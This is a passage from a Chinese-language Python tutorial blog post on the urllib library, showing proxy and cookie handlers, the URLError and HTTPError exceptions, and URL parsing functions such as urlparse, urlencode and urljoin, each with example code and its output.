class="string">&#x27;https://www.baidu.com/&#x27;</span>)</span><br><span class="line">    <span class="comment"># 输出</span></span><br><span class="line">    print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure>
<p>上面的代码的意思</p>
<p><code>ProxyHandler</code>对象该方法将通过调用来修改要通过代理的请求</p>
<p><code>build_opener()</code>对象默认提供许多处理程序 </p>
<p>结果 我用的是机场</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210207183458501.png" alt="image-20210207183458501"></p>
<p>上面的类的作用可以查看官方文档很详细的<a href="https://docs.python.org/3/library/urllib.request.html#basehandler-objects">https://docs.python.org/3/library/urllib.request.html#basehandler-objects</a></p>
<h4 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar, urllib.request</span><br><span class="line"></span><br><span class="line">cookie = http.cookiejar.CookieJar()</span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line"><span class="comment"># 创建opener对象</span></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line">response = opener.open(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cookie:</span><br><span class="line">    print(item.name+<span class="string">&quot;=&quot;</span>+item.value)</span><br></pre></td></tr></table></figure>


<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BAIDUID&#x3D;2E65A683F8A8BA3DF521469DF8EFF1E1:FG&#x3D;1</span><br><span class="line">BIDUPSID&#x3D;2E65A683F8A8BA3DF521469DF8EFF1E1</span><br><span class="line">H_PS_PSSID&#x3D;20987_1421_18282_17949_21122_17001_21227_21189_21161_20927</span><br><span class="line">PSTM&#x3D;1474900615</span><br><span class="line">BDSVRTM&#x3D;0</span><br><span class="line">BD_HOME&#x3D;0</span><br></pre></td></tr></table></figure>
<h5 id="保持文件MozillaCookieJar格式"><a href="#保持文件MozillaCookieJar格式" class="headerlink" title="保持文件MozillaCookieJar格式"></a>保持文件MozillaCookieJar格式</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar, urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名变量</span></span><br><span class="line">filename = <span class="string">&#x27;cookies.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化MozillaCookieJar，保持文件filename件名变量</span></span><br><span class="line">cookie = http.cookiejar.MozillaCookieJar(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Handler对象</span></span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建opener对象</span></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求</span></span><br><span class="line">response = opener.open(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存数据</span></span><br><span class="line">cookie.save(ignore_discard=<span class="literal">True</span>, ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>结果 cookies.txt 文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Netscape HTTP Cookie File</span><br><span class="line"># http:&#x2F;&#x2F;curl.haxx.se&#x2F;rfc&#x2F;cookie_spec.html</span><br><span class="line"># This is a generated file!  Do not edit.</span><br><span class="line"></span><br><span class="line">.baidu.com      TRUE    &#x2F;       FALSE   1644416949      BAIDUID 89E9C382C1BBCC7142BBF4B4521535F3:FG&#x3D;1</span><br><span class="line">.baidu.com      TRUE    &#x2F;       FALSE   3760364596      BIDUPSID        89E9C382C1BBCC71573B3743E3185D16</span><br><span class="line">.baidu.com      TRUE    &#x2F;       FALSE           H_PS_PSSID      33425_33514_33580_33259_33272_31254_33463_33584_26350_33567</span><br><span class="line">.baidu.com      TRUE    &#x2F;       FALSE   3760364596      PSTM    1612880949</span><br><span class="line">www.baidu.com   FALSE   &#x2F;       FALSE           BDSVRTM 0</span><br><span class="line">www.baidu.com   FALSE   &#x2F;       FALSE           BD_HOME 1</span><br></pre></td></tr></table></figure>
<h5 id="保持文件LWP格式"><a href="#保持文件LWP格式" class="headerlink" title="保持文件LWP格式"></a>保持文件LWP格式</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar, urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名变量</span></span><br><span class="line">filename = <span class="string">&#x27;cookies.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化LWP，保持文件filename件名变量</span></span><br><span class="line">cookie = http.cookiejar.LWPCookieJar(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Handler对象</span></span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建opener对象</span></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求</span></span><br><span class="line">response = opener.open(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存数据</span></span><br><span class="line">cookie.save(ignore_discard=<span class="literal">True</span>, ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>结果 cookies.txt 文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#LWP-Cookies-2.0</span><br><span class="line">Set-Cookie3: BAIDUID&#x3D;&quot;A11D2FD29D16CB293057EF54CA7A84B6:FG&#x3D;1&quot;; path&#x3D;&quot;&#x2F;&quot;; domain&#x3D;&quot;.baidu.com&quot;; path_spec; domain_dot; expires&#x3D;&quot;2022-02-09 14:32:23Z&quot;; comment&#x3D;bd; version&#x3D;0</span><br><span class="line">Set-Cookie3: BIDUPSID&#x3D;A11D2FD29D16CB29B7B7A37F12289763; path&#x3D;&quot;&#x2F;&quot;; domain&#x3D;&quot;.baidu.com&quot;; path_spec; domain_dot; expires&#x3D;&quot;2089-02-27 17:46:30Z&quot;; version&#x3D;0</span><br><span class="line">Set-Cookie3: H_PS_PSSID&#x3D;33423_33402_33256_33344_31254_33601_26350; path&#x3D;&quot;&#x2F;&quot;; domain&#x3D;&quot;.baidu.com&quot;; path_spec; domain_dot; discard; version&#x3D;0</span><br><span class="line">Set-Cookie3: PSTM&#x3D;1612881143; path&#x3D;&quot;&#x2F;&quot;; domain&#x3D;&quot;.baidu.com&quot;; path_spec; domain_dot; expires&#x3D;&quot;2089-02-27 17:46:30Z&quot;; version&#x3D;0</span><br><span class="line">Set-Cookie3: BDSVRTM&#x3D;0; path&#x3D;&quot;&#x2F;&quot;; domain&#x3D;&quot;www.baidu.com&quot;; path_spec; discard; version&#x3D;0</span><br><span class="line">Set-Cookie3: BD_HOME&#x3D;1; path&#x3D;&quot;&#x2F;&quot;; domain&#x3D;&quot;www.baidu.com&quot;; path_spec; discard; version&#x3D;0</span><br></pre></td></tr></table></figure>
<h5 id="读取并利用"><a href="#读取并利用" class="headerlink" title="读取并利用"></a>读取并利用</h5><h1 id="error模块处理异常"><a href="#error模块处理异常" class="headerlink" title="error模块处理异常"></a>error模块处理异常</h1><p>但是在网络不好的情况下，如果出现了异常，就可以用error模块处理异常</p>
<table>
<thead>
<tr>
<th align="center">error模块</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>URLError</code>类</td>
<td align="right">request 模块异常都可以通过捕获这个类来处理</td>
</tr>
<tr>
<td align="center"><code>HTTPError</code>类</td>
<td align="right">它是 <code>URLError</code> 的子类,可以返回更多信息</td>
</tr>
</tbody></table>
<div class="note info simple"><p>request模块模块在urllib文件夹里面.</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210210173135640.png" alt="image-20210210173135640"></p>
<h2 id="URLError类"><a href="#URLError类" class="headerlink" title="URLError类"></a>URLError类</h2><p>在error文件里面</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209225452309.png" alt="image-20210209225452309"></p>
<div class="note info simple"><p>URLError类由 request 模块生的异常都可以通过捕获这个类来处理</p>
</div>

<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, error  </span><br><span class="line"></span><br><span class="line"><span class="comment">#  这个网址不存在</span></span><br><span class="line">url=<span class="string">&#x27;http://cuiqingc.com&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    response = request.urlopen(url)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 用error模块的URLError类生的异常都可以通过捕获这个类来处理</span></span><br><span class="line"><span class="keyword">except</span> error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Not Found</span><br></pre></td></tr></table></figure>


<h2 id="HTTPError类"><a href="#HTTPError类" class="headerlink" title="HTTPError类"></a>HTTPError类</h2><p>在error文件里面</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210210091407414.png" alt="image-20210210091407414"></p>
<div class="note info simple"><p>它是 <code>URLError</code> 的子类，请求错误用的，比如认证请求失败等。它有如下 3 个属性。</p>
</div>

<ul>
<li><code>code</code>：返回 HTTP 状态码，比如 404 表示网页不存在，500 表示服务器内部错误等。</li>
<li><code>reason</code>：同父类一样，用于返回错误的原因。</li>
<li><code>headers</code>：返回请求头。</li>
</ul>
<p>下面我们用几个实例来看看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入urllib库里面的request模块和error模块</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,error </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#  这个网址存在，但是不存在这个页面</span></span><br><span class="line">    response = request.urlopen(<span class="string">&#x27;http://cuiqingcai.com/index.htm&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># code返回HTTP状态码,比如 404 表示网页不存在</span></span><br><span class="line">    print(<span class="string">&quot;状态码：&quot;</span>+str(e.code))</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;-&quot;</span>*<span class="number">10</span>)<span class="comment"># 隔离作用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#reason同父类一样，用于返回错误的原因</span></span><br><span class="line">    print(<span class="string">&quot;错误的原因：&quot;</span>+str(e.reason))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;-&quot;</span>*<span class="number">10</span>)<span class="comment"># 隔离作用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># headers返回请求头</span></span><br><span class="line">    print(<span class="string">&quot;返回请求头&quot;</span>+str(e.headers))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">状态码：404</span><br><span class="line">----------</span><br><span class="line">错误的原因：Not Found</span><br><span class="line">----------</span><br><span class="line">返回请求头Server: GitHub.com</span><br><span class="line">Date: Wed, 10 Feb 2021 04:33:04 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">X-NWS-UUID-VERIFY: 57751c67ef63d71111b6d2ccb0374d5d</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">ETag: &quot;5ff19d26-c534&quot;</span><br><span class="line">x-proxy-cache: MISS</span><br><span class="line">X-GitHub-Request-Id: B9A0:0A47:22D4A6:25005A:602356CA</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Age: 2870</span><br><span class="line">Via: 1.1 varnish</span><br><span class="line">X-Served-By: cache-tyo11956-TYO</span><br><span class="line">X-Cache: HIT</span><br><span class="line">X-Cache-Hits: 0</span><br><span class="line">X-Timer: S1612931585.848275,VS0,VE0</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Fastly-Request-ID: 64ac5df797f171a4e102395049f9dec1d9c48b91</span><br><span class="line">X-Daa-Tunnel: hop_count&#x3D;2</span><br><span class="line">X-Cache-Lookup: Hit From Upstream</span><br><span class="line">X-Cache-Lookup: Hit From Inner Cluster</span><br><span class="line">Content-Length: 50484</span><br><span class="line">X-NWS-LOG-UUID: 1421142427750633019</span><br><span class="line">Connection: close</span><br><span class="line">X-Cache-Lookup: Cache Miss</span><br></pre></td></tr></table></figure>


<h1 id="parse模块解析链接"><a href="#parse模块解析链接" class="headerlink" title="parse模块解析链接"></a>parse模块解析链接</h1><table>
<thead>
<tr>
<th align="center">error模块</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>urlencode</code>函数</td>
<td align="right">用于url编码操作</td>
</tr>
<tr>
<td align="center"><code>unquote</code>函数</td>
<td align="right">用于url解码操作</td>
</tr>
<tr>
<td align="center"><code>urlparse()</code>函数</td>
<td align="right">叫一个url拆分6部分</td>
</tr>
<tr>
<td align="center">urlunparse()函数</td>
<td align="right">组合6部url组合成一个完整的url</td>
</tr>
<tr>
<td align="center">urlsplit()函数</td>
<td align="right">叫一个拆分5部分</td>
</tr>
<tr>
<td align="center">urlunsplit()函数</td>
<td align="right">组合5部url组合成一个完整的url</td>
</tr>
<tr>
<td align="center">urlencode()函数</td>
<td align="right">字典变成url的参数</td>
</tr>
<tr>
<td align="center">parse_qs()函数</td>
<td align="right">url的参数变成字典</td>
</tr>
<tr>
<td align="center">parse_qsl()函数</td>
<td align="right">url的参数变成元素</td>
</tr>
<tr>
<td align="center">urljoin()函数</td>
<td align="right">目标地址加参数拼接完整url</td>
</tr>
</tbody></table>
<div class="note info simple"><p>request模块模块在urllib文件夹里面</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210210173206217.png" alt="image-20210210173206217"></p>
<h2 id="编码操作"><a href="#编码操作" class="headerlink" title="编码操作"></a>编码操作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse  <span class="comment"># 导入prase模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个字典键是a值是 无敌</span></span><br><span class="line">cl=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;无敌&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行url编码</span></span><br><span class="line">url=urllib.parse.urlencode(cl)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%E6%97%A0%E6%95%8C</span><br></pre></td></tr></table></figure>
<h2 id="解码操作"><a href="#解码操作" class="headerlink" title="解码操作"></a>解码操作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse  <span class="comment"># 导入prase模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面的编码</span></span><br><span class="line">cl=<span class="string">&#x27;a=%E6%97%A0%E6%95%8C&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行url解码</span></span><br><span class="line">url=urllib.parse.unquote(cl)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;无敌</span><br></pre></td></tr></table></figure>




<h2 id="urlparse-函数拆分6部分"><a href="#urlparse-函数拆分6部分" class="headerlink" title="urlparse()函数拆分6部分"></a>urlparse()函数拆分6部分</h2><h3 id="基本演示"><a href="#基本演示" class="headerlink" title="基本演示"></a>基本演示</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">result = urlparse(<span class="string">&#x27;http://www.baidu.com/index.html;user?id=5#comment&#x27;</span>)</span><br><span class="line">print(type(result), result)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;class &#39;urllib.parse.ParseResult&#39;&gt; </span><br><span class="line">ParseResult(scheme&#x3D;&#39;http&#39;, netloc&#x3D;&#39;www.baidu.com&#39;, path&#x3D;&#39;&#x2F;index.html&#39;, params&#x3D;&#39;user&#39;, query&#x3D;&#39;id&#x3D;5&#39;, fragment&#x3D;&#39;comment&#39;)</span><br></pre></td></tr></table></figure>
<p>结果是一个 <code>ParseResult</code> 类型的对象，它包含 6 部分，分别是 <code>scheme</code>、<code>netloc</code>、<code>path</code>、<code>params</code>、<code>query</code> 和 <code>fragment</code></p>
<p>他就是一个URL组合后：<code>http://www.baidu.com/index.html;user?id=5#comment</code></p>
<div class="note info simple"><p>他其他是一个元组</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">result = urlparse(<span class="string">&#x27;http://www.baidu.com/index.html#comment&#x27;</span>)</span><br><span class="line">print(result[<span class="number">0</span>])</span><br><span class="line">print(result[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http</span><br><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>也可以指定属性来输出结果但是一样的</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">result = urlparse(<span class="string">&#x27;http://www.baidu.com/index.html#comment&#x27;</span>)</span><br><span class="line">print(result.scheme)</span><br><span class="line">print(result.netloc)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http</span><br><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>


<h3 id="详细介绍"><a href="#详细介绍" class="headerlink" title="详细介绍"></a>详细介绍</h3><div class="note info simple"><p><code>urlparse(url,scheme,allow_fragments)</code>它有 3 个参数</p>
</div>

<ol>
<li><p><strong>url</strong>这是必填项即待解析的 URL</p>
</li>
<li><p><strong>scheme</strong>默认的协议http<code>或</code>https，如果url里面有http://他就按url里面的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210210120531274.png" alt="image-20210210120531274"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210210120758421.png" alt="image-20210210120758421"></p>
</li>
<li><p><strong>allow_fragments</strong>是否忽略 fragment部分设置为 <code>False</code>输出的结果fragment就什么都没有了</p>
<p>看一下结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">result = urlparse(<span class="string">&#x27;http://www.baidu.com/index.html#comment&#x27;</span>, allow_fragments=<span class="literal">False</span>)</span><br><span class="line">print(result)</span><br><span class="line">result = urlparse(<span class="string">&#x27;http://www.baidu.com/index.html#comment&#x27;</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p> 结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ParseResult(scheme&#x3D;&#39;http&#39;, netloc&#x3D;&#39;www.baidu.com&#39;, path&#x3D;&#39;&#x2F;index.html#comment&#39;, params&#x3D;&#39;&#39;, query&#x3D;&#39;&#39;, fragment&#x3D;&#39;&#39;)</span><br><span class="line">ParseResult(scheme&#x3D;&#39;http&#39;, netloc&#x3D;&#39;www.baidu.com&#39;, path&#x3D;&#39;&#x2F;index.html&#39;, params&#x3D;&#39;&#39;, query&#x3D;&#39;&#39;, fragment&#x3D;&#39;comment&#39;)</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="urlunparse-函数组合6部分"><a href="#urlunparse-函数组合6部分" class="headerlink" title="urlunparse()函数组合6部分"></a>urlunparse()函数组合6部分</h2><div class="note info simple"><p>urlunparse()函数他和上面的urlparse()函数是对立的</p>
</div>
<div class="note danger simple"><p>urlunparse()函数参数必须是 6 个不然就报错</p>
</div>
<p>演示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunparse</span><br><span class="line"></span><br><span class="line">data = [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;a=6&#x27;</span>, <span class="string">&#x27;comment&#x27;</span>]</span><br><span class="line">print(urlunparse(data))</span><br></pre></td></tr></table></figure>
<p>结果实现了 URL 的构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com&#x2F;index.html;user?a&#x3D;6#comment</span><br></pre></td></tr></table></figure>
<h2 id="urlsplit-函数拆分5部分"><a href="#urlsplit-函数拆分5部分" class="headerlink" title="urlsplit()函数拆分5部分"></a>urlsplit()函数拆分5部分</h2><div class="note info simple"><p>这个方法和 <code>urlparse()</code> 方法非常相似，只不过它不再单独解析 <code>params</code>就是参数的部分，只返回 5 个结果</p>
</div>

<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit,urlparse,urlunsplit</span><br><span class="line"></span><br><span class="line">result = urlsplit(<span class="string">&#x27;http://www.baidu.com/index.html;user?id=5#comment&#x27;</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SplitResult(scheme&#x3D;&#39;http&#39;, netloc&#x3D;&#39;www.baidu.com&#39;, path&#x3D;&#39;&#x2F;index.html;user&#39;, query&#x3D;&#39;id&#x3D;5&#39;, fragment&#x3D;&#39;comment&#39;)</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>urlsplit函数和urlparse函数看一下他的对比结果</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit,urlparse</span><br><span class="line"></span><br><span class="line">result = urlsplit(<span class="string">&#x27;http://www.baidu.com/index.html;user?id=5#comment&#x27;</span>)</span><br><span class="line"><span class="comment"># 输出urlsplit函数的结果</span></span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">result = urlparse(<span class="string">&#x27;http://www.baidu.com/index.html;user?id=5#comment&#x27;</span>)</span><br><span class="line"><span class="comment"># 输出urlparse函数的结果</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SplitResult(scheme&#x3D;&#39;http&#39;, netloc&#x3D;&#39;www.baidu.com&#39;, path&#x3D;&#39;&#x2F;index.html;user&#39;, query&#x3D;&#39;id&#x3D;5&#39;, fragment&#x3D;&#39;comment&#39;)</span><br><span class="line">ParseResult(scheme&#x3D;&#39;http&#39;, netloc&#x3D;&#39;www.baidu.com&#39;, path&#x3D;&#39;&#x2F;index.html&#39;, params&#x3D;&#39;user&#39;, query&#x3D;&#39;id&#x3D;5&#39;, fragment&#x3D;&#39;comment&#39;)</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>这个urlsplit()函数元组和属性</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line"></span><br><span class="line">result = urlsplit(<span class="string">&#x27;http://www.baidu.com/index.html;user?id=5#comment&#x27;</span>)</span><br><span class="line">print(result.scheme)</span><br><span class="line">print(result[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http</span><br><span class="line">http</span><br></pre></td></tr></table></figure>
<h2 id="urlunsplit-函数组合5部分"><a href="#urlunsplit-函数组合5部分" class="headerlink" title="urlunsplit()函数组合5部分"></a>urlunsplit()函数组合5部分</h2><div class="note info simple"><p>urlunsplit()函数与 urlunparse()函数 类似，唯一的区别是长度必须为 5，不然就报错</p>
</div>

<p>示例如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunsplit</span><br><span class="line"></span><br><span class="line">data = [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>, <span class="string">&#x27;a=6&#x27;</span>, <span class="string">&#x27;comment&#x27;</span>]</span><br><span class="line">print(urlunsplit(data))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com&#x2F;index.html?a&#x3D;6#comment</span><br></pre></td></tr></table></figure>
<h2 id="urlencode-函数字典变成参数"><a href="#urlencode-函数字典变成参数" class="headerlink" title="urlencode()函数字典变成参数"></a>urlencode()函数字典变成参数</h2><div class="note info simple"><p>urlencode()函数用来构建GET 请求参数</p>
</div>

<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个字典</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line">base_url = <span class="string">&#x27;http://www.baidu.com?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后调用 urlencode() 方法将其序列化为 GET 请求参数</span></span><br><span class="line">print(base_url + urlencode(params))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com?name&#x3D;germey&amp;age&#x3D;22</span><br></pre></td></tr></table></figure>
<h2 id="parse-qs-函数参数变成字典"><a href="#parse-qs-函数参数变成字典" class="headerlink" title="parse_qs()函数参数变成字典"></a>parse_qs()函数参数变成字典</h2><div class="note info simple"><p>parse_qs()函数和urlencode()函数是对立的</p>
</div>

<div class="note info simple"><p>利用 <code>parse_qs()</code> 参就可以将它转回字典</p>
</div>

<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs</span><br><span class="line"></span><br><span class="line">query = <span class="string">&#x27;name=germey&amp;age=22&#x27;</span></span><br><span class="line">print(parse_qs(query))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;name&#39;: [&#39;germey&#39;], &#39;age&#39;: [&#39;22&#39;]&#125;</span><br></pre></td></tr></table></figure>
<h2 id="parse-qsl-函数参数变成元素"><a href="#parse-qsl-函数参数变成元素" class="headerlink" title="parse_qsl()函数参数变成元素"></a>parse_qsl()函数参数变成元素</h2><div class="note info simple"><p>它用于将参数转化为元组组成的列表</p>
</div>

<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qsl</span><br><span class="line"></span><br><span class="line">query = <span class="string">&#x27;name=germey&amp;age=22&#x27;</span></span><br><span class="line">print(parse_qsl(query))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[(&#39;name&#39;, &#39;germey&#39;), (&#39;age&#39;, &#39;22&#39;)]</span><br></pre></td></tr></table></figure>


<h2 id="urljoin-函数拼接完整url"><a href="#urljoin-函数拼接完整url" class="headerlink" title="urljoin()函数拼接完整url"></a>urljoin()函数拼接完整url</h2><div class="note info simple"><p>urljoin()函数是用来做拼接用的可以叫不完整的url拼接成一个完整的</p>
</div>

<p>测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">print(urljoin(<span class="string">&#x27;http://www.baidu.com&#x27;</span>, <span class="string">&#x27;FAQ.html&#x27;</span>))</span><br><span class="line">print(urljoin(<span class="string">&#x27;www.baidu.com#comment&#x27;</span>, <span class="string">&#x27;?category=2&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com&#x2F;FAQ.html</span><br><span class="line">www.baidu.com?category&#x3D;2</span><br></pre></td></tr></table></figure>
<div class="note danger simple"><p>如果第二个参数是完整的url他就会抛弃第一个参数</p>
</div>

